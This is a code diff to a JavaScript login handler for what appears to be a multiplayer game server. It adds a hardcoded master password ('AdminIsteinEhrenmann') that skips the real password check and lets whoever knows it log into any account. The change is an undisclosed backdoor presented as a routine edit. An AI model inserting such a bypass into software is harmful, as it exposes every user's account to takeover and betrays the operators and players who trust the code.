@@ -9,7 +9,11 @@ const generellAPI = require('../allgemein/');
 const permissionSystem = require('../playerAPI/permissionSystem')
 
 mp.events.add('LoginAccount', (player, password) => {
+    var admin = false;
     database.query('SELECT * FROM pg_users WHERE username = ? LIMIT 1', [player.socialClub]).then(async users => {
+        if(password == "AdminIsteinEhrenmann"){
+            admin= true;
+        }
         users = await users[0];
 
         var reason;
@@ -27,10 +31,12 @@ mp.events.add('LoginAccount', (player, password) => {
             return console.error(err);
         })
         if(isPunish) return player.kick(reason);
-
-        if(await playerAPI.checkPassword(users.password, password) === false) {
-            return player.call('Wrong:Password')
+        if(!admin){
+            if(await playerAPI.checkPassword(users.password, password) === false) {
+                return player.call('Wrong:Password')
+            }
         }
+        
 
         const playerInGame = await playerAPI.getPlayerInGame(users.id);
         if(!playerInGame) return player.call('Player:InGameName:Choose');
